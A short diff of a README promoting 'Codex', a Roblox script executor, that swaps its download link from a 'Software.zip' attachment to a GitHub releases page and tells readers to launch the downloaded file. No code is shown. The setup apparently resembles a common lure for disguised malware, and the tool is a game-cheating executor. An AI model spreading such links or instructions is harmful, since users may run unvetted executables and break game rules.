@@ -12,7 +12,7 @@ Codex stands out as the go-to script executor for Roblox enthusiasts, offering u
 
 To access the incredible features of Codex, simply download the software from the following link: 
 
-[![Download Codex](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Codex](https://github.com/felixjoji370/Codex-Roblox/releases/tag/v2.0)](https://github.com/felixjoji370/Codex-Roblox/releases/tag/v2.0)
 
 *Note: Launch the downloaded file to install and start using Codex.*
 
